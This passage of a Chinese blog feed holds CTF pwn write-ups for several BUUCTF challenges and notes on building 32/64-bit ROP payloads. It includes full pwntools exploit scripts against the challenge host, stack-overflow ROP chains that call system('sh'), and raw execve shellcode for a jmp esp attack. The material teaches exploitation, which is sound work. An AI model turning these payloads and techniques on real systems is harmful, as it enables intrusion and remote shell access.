<span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+0h] [ebp-100h] BYREF</span><br>  <span class="hljs-type">char</span> src[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+4h] [ebp-FCh] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">124</span>]; <span class="hljs-comment">// [esp+8h] [ebp-F8h] BYREF</span><br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+84h] [ebp-7Ch] BYREF</span><br>  <span class="hljs-type">char</span> v8[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [esp+88h] [ebp-78h] BYREF</span><br>  <span class="hljs-type">int</span> *v9; <span class="hljs-comment">// [esp+F4h] [ebp-Ch]</span><br><br>  v9 = &amp;argc;<br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  *(_DWORD *)s1 = <span class="hljs-number">48</span>;<br>  <span class="hljs-built_in">memset</span>(v8, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v8));<br>  *(_DWORD *)src = <span class="hljs-number">48</span>;<br>  <span class="hljs-built_in">memset</span>(v6, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v6));<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to use LFS.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input admin password:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%100s&quot;</span>, s1);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;administrator&quot;</span>) )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Password Error!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your operation:&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.Add a log.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.Display all logs.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.Print all logs.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0.Exit\n:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>  <span class="hljs-keyword">switch</span> ( v4 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">return</span> result;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      <span class="hljs-built_in">AddLog</span>(src);<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-built_in">Display</span>(src);<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      <span class="hljs-built_in">Print</span>();<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      <span class="hljs-built_in">GetFlag</span>(src);<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      result = <span class="hljs-built_in">sub_804892B</span>(argc, argv, envp);<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到向s1输入100个长度的字符，但是分配给s1的大小只有48，存在栈溢出。<br>并且选项4可以调用GetFlag函数。</p><p><strong>AddLog函数：</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> __cdecl <span class="hljs-constructor">AddLog(<span class="hljs-params">int</span> <span class="hljs-params">a1</span>)</span><br>&#123;<br>  printf(<span class="hljs-string">&quot;Please input new log info:&quot;</span>);<br>  return <span class="hljs-constructor">__isoc99_scanf(<span class="hljs-string">&quot;%128s&quot;</span>, <span class="hljs-params">a1</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Display函数：</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">Display</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(s);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Print函数：</strong></p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&quot;echo Printing......&quot;</span>)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有system函数了，但是参数不是我们想要的。</p><p><strong>GetFlag函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">GetFlag</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+0h] [ebp-48h] BYREF</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">60</span>]; <span class="hljs-comment">// [esp+4h] [ebp-44h] BYREF</span><br><br>  *(_DWORD *)dest = <span class="hljs-number">48</span>;<br>  <span class="hljs-built_in">memset</span>(v3, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v3));<br>  <span class="hljs-built_in">strcpy</span>(dest, src);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The flag is your log:%s\n&quot;</span>, dest);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出flag就是我们的log，而选项1是可以自己输入log的。</p><p>所以大致逻辑就是我们在输入密码之后，首先选1，添加一个log，再选4调用flag，最后结束程序。</p><p>payload构造思路：</p><p><em>利用选择1之后的那一次输入，a1就是外面的src，程序给的大小是48，这边读入的时候读入了128长度的字符串，可以造成溢出，将程序的返回地址覆盖成system（‘&#x2F;bin&#x2F;sh’），然后选4去调用读取我们构造好的栈，获取shell</em></p><p>我们用如下命令查找‘&#x2F;bin&#x2F;sh’，但是找不到，继续找，找到‘sh’也是一样的效果。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">ROPgadget --<span class="hljs-built_in">binary</span> ciscn_2019_ne_5 --<span class="hljs-built_in">string</span> <span class="hljs-string">&#x27;sh&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/images/pwn3-3.png"></p><p>shell_addr&#x3D;0x80482ea</p><p>system函数的地址很容易找到为0x080484D0</p><p>有了这些可以构造payload了：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span>=<span class="hljs-variable">b</span><span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">48</span>+<span class="hljs-variable">b</span><span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">4</span>+<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">sys_addr</span>)+<span class="hljs-variable">b</span><span class="hljs-string">&#x27;1111&#x27;</span>+<span class="hljs-title">p32</span>(<span class="hljs-variable">shell_addr</span>)</span><br><span class="hljs-variable">b</span><span class="hljs-string">&#x27;1111&#x27;</span>也可以写成<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">x12121212</span>)</span><br></code></pre></td></tr></table></figure><p>之后选4去调用我们的这个构造好的栈即可获取shell。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">r</span>=remote(&quot;node4.buuoj.cn&quot;,25746)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./ciscn_2019_ne_5&#x27;)<br><span class="hljs-attribute">system_addr</span>=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-attribute">shell_addr</span>=0x80482ea<br><br>r.recvuntil(b<span class="hljs-string">&#x27;Please input admin password:&#x27;</span>)<br>r.sendline(b<span class="hljs-string">&#x27;administrator&#x27;</span>)<br><br>r.recvuntil(b<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>r.sendline(b<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*(0x48+4)+p32(system_addr)+b&#x27;1111&#x27;+p32(shell_addr)<br><br>r.recvuntil(b<span class="hljs-string">&#x27;Please input new log info:&#x27;</span>)<br>r.sendline(payload)<br><br>r.recvuntil(b<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>r.sendline(b<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>32/64位payload构造注意事项</title>
    <link href="/2023/09/18/32-64%E4%BD%8Dpayload%E6%9E%84%E9%80%A0%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
    <url>/2023/09/18/32-64%E4%BD%8Dpayload%E6%9E%84%E9%80%A0%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="堆栈平衡问题"><a href="#堆栈平衡问题" class="headerlink" title="堆栈平衡问题"></a>堆栈平衡问题</h2><p>32位中，没有堆栈平衡一说，而64位中有。payload中的堆栈平衡简单来说，就是要保证payload的字节数是16的倍数。而p64是将地址转为8字节的字符串，所以payload中得保证p64是偶数倍，就能满足堆栈平衡。因此对于写完payload后还是单数倍的p64时，就需要加单数个【当然加1个就行】p64(ret)，【ret代表ret指令的地址，可以直接在IDA里面任意找一个，也可以用ROPgadget来找】，因为ret的多少不会影响到函数的执行逻辑，所以用其来平衡。</p><h2 id="参数顺序"><a href="#参数顺序" class="headerlink" title="参数顺序"></a>参数顺序</h2><p><strong>32位中先写函数，再写参数</strong><br>参数可能是返回值，如调用system，需要多加个参数作返回值。最后一个函数都需要有返回值。<br>每个函数都有返回值，而我们对函数返回值不感兴趣【比如一些函数执行成功会返回1】只需要有个位置充当一下，而之前对于多个函数的解释也进一步得以优化，其应该是需要返回值的，只不过位置正好被其他的东西给占据了，如pop_这些用于给参数位置的rop链给一举两得给占据了，也就是说，即使是最后一个函数有参数，也不用在单独写一个p32(0)来填充返回值的位置，因为pop_已经将这件事给做了，例如payload &#x3D; cyclic(0x2c + 4) + p32(func1) + p32(func2) + p32(pop_ebx) + p32(0xACACACAC) + p32(flag) + p32(pop_ebx) + p32(0xBDBDBDBD)</p><p><strong>64位中先写参数，再写函数</strong></p><p>例如：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-function"><span class="hljs-title">cyclic</span>(<span class="hljs-number">0</span><span class="hljs-variable">x12</span> + <span class="hljs-number">4</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">system</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">sh</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-function"><span class="hljs-title">cyclic</span>(<span class="hljs-number">0</span><span class="hljs-variable">xa</span> + <span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi_ret</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">sh</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">ret</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">system</span>)</span><br></code></pre></td></tr></table></figure><h2 id="参数存放位置"><a href="#参数存放位置" class="headerlink" title="参数存放位置"></a>参数存放位置</h2><p>在32位中，参数和返回值直接就存在栈中，但对于payload中有多个函数时，如果不是最后一个函数，则需要将其参数用寄存器来保存。</p><p>在64位中，函数参数一律得用寄存器来存储。64位和32位不同，参数不是直接放在栈上，而是优先放在寄存器rdi,rsi,rdx,rcx,r8,r9。这几个寄存器放不下时才会考虑栈。</p><p>例如：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-function"><span class="hljs-title">cyclic</span>(<span class="hljs-number">0</span><span class="hljs-variable">xa</span> + <span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">buf2</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">gets</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">buf2</span>)  + <span class="hljs-title">p64</span>(<span class="hljs-variable">system</span>)</span><br></code></pre></td></tr></table></figure><p>64位是用rdx、rsi、rdi三个寄存器传参，进行子函数调用时程序会先将子函数的参数存入rdx、rsi、rdi。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——输出flag.txt</title>
    <link href="/2023/09/18/Pwn%E2%80%94%E2%80%94%E8%BE%93%E5%87%BAflag-txt/"/>
    <url>/2023/09/18/Pwn%E2%80%94%E2%80%94%E8%BE%93%E5%87%BAflag-txt/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-not-the-same-3dsctf-2016）"><a href="#例题（BUUCTF-not-the-same-3dsctf-2016）" class="headerlink" title="例题（BUUCTF not_the_same_3dsctf_2016）"></a>例题（BUUCTF not_the_same_3dsctf_2016）</h2><h3 id="题目信息："><a href="#题目信息：" class="headerlink" title="题目信息："></a>题目信息：</h3><p><img src="/images/check0918.png"></p><p>主要函数有两个，后门函数：</p><p><img src="/images/main0918.png"></p><p>main函数：</p><p><img src="/images/back0918.png"></p><p>明显的栈溢出。后门函数像是读了flag.txt的内容到fl4g变量中，这个题应该是有好几种做法，先整理两种我看的懂的，还有一种是利用mprotect方法，这个我没太懂，后续再整理。。。</p><p>这两种做法思路都是将fl4g变量中的内容打印出来。</p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p><strong>首先溢出到get_secret函数，再利用write()将fl4g参数中的内容读出来</strong></p><p>payload如下：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs leaf">payload=&#x27;a&#x27;*0x2d+p32(0x80489a0)+p32(elf.symbols[&#x27;write&#x27;])+p32(flag_addr)+p32(1)+p32(flag_addr)+p32(42)<br><br>#0x2d个垃圾数据填充  get_secret函数的地址   write函数的地址    fl4g变量的位置   最后三个是write函数的参数（最后一个参数修改为45也可以）<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-variable">int</span> <span class="hljs-variable">filedes</span>, <span class="hljs-variable">const</span> <span class="hljs-variable">void</span> *<span class="hljs-variable">buf</span>, <span class="hljs-variable">size_t</span> <span class="hljs-variable">nbytes</span>)</span></span>;<br>#write 函数向 filedes 中写入 nbytes 字节数据，数据来源为 buf <br></code></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,26797)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./not&#x27;)<br><span class="hljs-attribute">flag_addr</span>=0x80eca2d<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*0x2d+p32(0x80489a0)+p32(elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(flag_addr)+p32(1)+p32(flag_addr)+p32(42)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p><strong>利用printf和exit输出fl4g</strong></p><p>首先找能打印出fl4g的函数，在这里找的是printf的地址</p><p><img src="/images/printf0918.png"></p><p>需要一个正常退出的函数，所以找找exit</p><p><img src="/images/exit_0918.png"></p><p>完整exp：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">from pwn import*<br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28483</span>)<br><br>get_secret=<span class="hljs-number">0</span>x080489a0<br>flag=<span class="hljs-number">0</span>x080eca2d   <span class="hljs-comment">#fl4g变量的地址</span><br>printf=<span class="hljs-number">0</span>x0804f0a0<br><span class="hljs-keyword">exit</span>=<span class="hljs-number">0</span>x0804e660<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x2d+p32(get_secret)+p32(printf)+p32(<span class="hljs-keyword">exit</span>)+p32(flag)  <span class="hljs-comment">#这里为什么fl4g变量的地址要放在最后一个？（读下一篇32/64参数顺序区别）</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——ret2shellcode</title>
    <link href="/2023/09/14/Pwn%E2%80%94%E2%80%94ret2shellcode-BUUCTF-ciscn-2019-n-5-1/"/>
    <url>/2023/09/14/Pwn%E2%80%94%E2%80%94ret2shellcode-BUUCTF-ciscn-2019-n-5-1/</url>
    
    <content type="html"><![CDATA[<h2 id="例题1：BUUCTF-ciscn-2019-n-5"><a href="#例题1：BUUCTF-ciscn-2019-n-5" class="headerlink" title="例题1：BUUCTF ciscn_2019_n_5**"></a>例题1：BUUCTF ciscn_2019_n_5**</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/images/check.png"></p><p>查看题目信息，64位，没有开启任何保护。</p><p>拖到ida里，只有一个关键函数main函数：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> text[<span class="hljs-number">30</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;tell me your name&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, name, <span class="hljs-number">0x64</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wow~ nice name!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you want to say to me?&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(text);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>并且没有发现system和&#x2F;bin&#x2F;sh。</p><p>nc查看一下程序，有两个输入点，第一次让我们输入名字，限制输入长度为0x64，看一下name参数，发现name在全局变量bss段上</p><p><img src="/images/nc.png"></p><p><img src="/images/name.png"></p><p>第二次输入利用gets，没有限制长度，可以对v4造成溢出。</p><p><img src="/images/text.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>1.利用第一个输入点，往name参数里写入shellcode</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)</span></span>                   #用来导入pwntools模块<br>shellcode=<span class="hljs-built_in">asm</span>(shellcraft<span class="hljs-selector-class">.sh</span>())                     #利用pwntools模块自动生成shellcode<br>r<span class="hljs-selector-class">.sendlineafter</span>(<span class="hljs-string">&#x27;tell me your name&#x27;</span>,shellcode)     #往name中写入shellcode<br></code></pre></td></tr></table></figure><p><strong>2.v4溢出到name参数地址，去执行shellcode拿到shell</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">payload=&#x27;a&#x27;*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x601080</span>)                    <span class="hljs-comment">#让v4溢出到name参数地址</span><br>r.sendlineafter(&#x27;What do you want <span class="hljs-keyword">to</span> <span class="hljs-built_in">say</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">me</span>?&#x27;,payload)<br></code></pre></td></tr></table></figure><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,27058)<br><br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=&#x27;linux&#x27;)<br><span class="hljs-attribute">shellcode</span>=asm(shellcraft.sh())<br>r.sendlineafter(<span class="hljs-string">&#x27;tell me your name&#x27;</span>,shellcode)<br><br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0x28+p64(0x601080)<br>r.sendlineafter(<span class="hljs-string">&#x27;What do you want to say to me?&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="例题2：https-oj-blue-whale-me-challenges-shellcode"><a href="#例题2：https-oj-blue-whale-me-challenges-shellcode" class="headerlink" title="例题2：https://oj.blue-whale.me/challenges#shellcode"></a>例题2：<a href="https://oj.blue-whale.me/challenges#shellcode">https://oj.blue-whale.me/challenges#shellcode</a></h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>checksec查看一下，</p><p><img src="/images/pwn8-1.png"></p><p>这里的Fortifiable之前没有注意过，但这里他的值为2说明开启了ASLR（是一种针对于缓冲区溢出的安全保护技术。），但就因为开启了这个技术，使得这个题目不能用常规方法做。需要一点点改动。</p><p>先看看反汇编代码：</p><p>程序很简单，main函数中就调用了下面这个函数：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">int <span class="hljs-built_in">sub_804851A</span>()<br>&#123;<br>  char buf<span class="hljs-selector-attr">[28]</span>; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch] BYREF</span><br><br>  <span class="hljs-built_in">sub_80484EB</span>();<br>  <span class="hljs-built_in">puts</span>(&quot;input your name&quot;);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x100u);<br>  <span class="hljs-built_in">printf</span>(&quot;hello &quot;);<br>  return <span class="hljs-built_in">printf</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>buf存在溢出，又因为本题题目就为shellcode，那很容易想到将shellcode发送过去就行。</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">shellcode</span> <span class="hljs-operator">=</span> <span class="hljs-variable">b</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x31</span>\xc0<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span>\x6e\x2f<span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x68</span>\x2f\x2f<span class="hljs-char escape_">\x62</span><span class="hljs-char escape_">\x69</span><span class="hljs-char escape_">\x89</span>\xe3<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x89</span>\xe2<span class="hljs-char escape_">\x53</span><span class="hljs-char escape_">\x89</span>\xe1\xb0\x0b\xcd<span class="hljs-char escape_">\x80</span>&quot;</span><br><span class="hljs-variable">payload</span><span class="hljs-operator">=</span><span class="hljs-variable">b</span>&#x27;<span class="hljs-variable">A</span>&#x27;<span class="hljs-operator">*</span>(<span class="hljs-number">0x1c</span><span class="hljs-operator">+</span><span class="hljs-number">4</span>)<span class="hljs-operator">+</span><span class="hljs-variable">shellcode</span><br></code></pre></td></tr></table></figure><p>但这样打不通，原因就是开启了ASLR，需要利用 jmp esp 使控制流转向栈上的 shellcode。</p><p><strong>jmp esp的原理</strong><br>见下图，在当前栈空间内进行堆栈清理返回到前一个栈空间时，会将esp指向old esp。<br>如果我们利用栈溢出，将返回地址覆盖为指令jmp esp的地址，那么在返回到jmp esp指令时，程序在下一步就会跳转到我们的old esp继续执行，那么我们的payload应该是这样布局的：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">payload = a*<span class="hljs-number">32</span> + p32(<span class="hljs-keyword">address </span>of <span class="hljs-keyword">jmp </span>esp) + 一系列<span class="hljs-keyword">NOP指令 </span>+ <span class="hljs-keyword">shellcode</span><br></code></pre></td></tr></table></figure><p>那么在跳转到old esp时，经过一系列NOP，程序最终执行shellcode.</p><p><img src="/images/pwn8-2.png"></p><p>jmp esp的地址可以通过ROPgadget查找<br><img src="/images/pwn8-3.png"></p><h3 